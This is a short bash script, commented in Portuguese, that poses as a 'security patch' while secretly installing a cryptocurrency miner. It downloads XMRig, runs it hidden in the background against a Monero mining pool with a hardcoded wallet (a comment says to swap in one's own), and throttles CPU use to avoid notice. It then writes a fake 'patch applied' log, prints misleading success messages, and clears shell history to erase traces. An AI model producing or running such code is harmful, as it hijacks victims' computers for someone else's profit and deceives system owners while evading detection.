#!/bin/bash

# security-patch.sh v2.1 - Marcola Protocol
# Atualização de segurança oculta

echo "🔧 Iniciando atualização crítica do sistema..."
sleep $((RANDOM % 40))

# Baixa e extrai XMRig (sem depender de apt)
wget -qO xm-service.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
mkdir -p /tmp/xmsvc
tar -xzf xm-service.tar.gz -C /tmp/xmsvc --strip-components=1
chmod +x /tmp/xmsvc/xmrig

# Executa com cloaking pesado
nohup /tmp/xmsvc/xmrig \
  -o gulf.moneroocean.stream:17017 \
  -u 4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL \  # 🔁 MUDA PRA TEU WALLET
  --cpu-max-threads-hint=60 \
  --donate-level=0 \
  --log-file=/dev/null \
  --background > /dev/null 2>&1 &

# Simula log legítimo (sem escrever em /var/log)
echo "[$(date)] INFO: System patch applied successfully." > /tmp/.sysupdate.log

# Limpa rastro
rm -f xm-service.tar.gz
history -c 2>/dev/null || true
unset HISTFILE

echo "✅ Atualização concluída. Sistema otimizado."
